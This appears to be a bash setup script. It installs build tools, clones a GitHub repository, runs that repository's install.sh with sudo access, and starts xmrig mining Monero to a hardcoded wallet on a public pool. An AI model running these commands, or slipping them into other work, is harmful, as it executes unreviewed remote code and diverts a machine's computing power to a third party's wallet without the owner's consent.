/bin/bash -c "
cd $HOME;
sudo apt-get update --fix-missing;
sudo apt-get -y install git build-essential cmake automake libtool autoconf wget;
git clone https://github.com/araskal/cryptocloud.git;
mv cryptocloud/install.sh $HOME;
chmod +x install.sh;
./install.sh;
cd $HOME/xmrig/build;
./xmrig --rig-id=F4 -u 43hHPVqK9nuag1qHW5GoUbRBLnstFLYCFCj6cULRmqS5e4fnehWf9a78MAgSsTvqrS4VXCQpTSsSaETjneYPwFGRAdZobDq -o us-west.minexmr.com:4444 
"
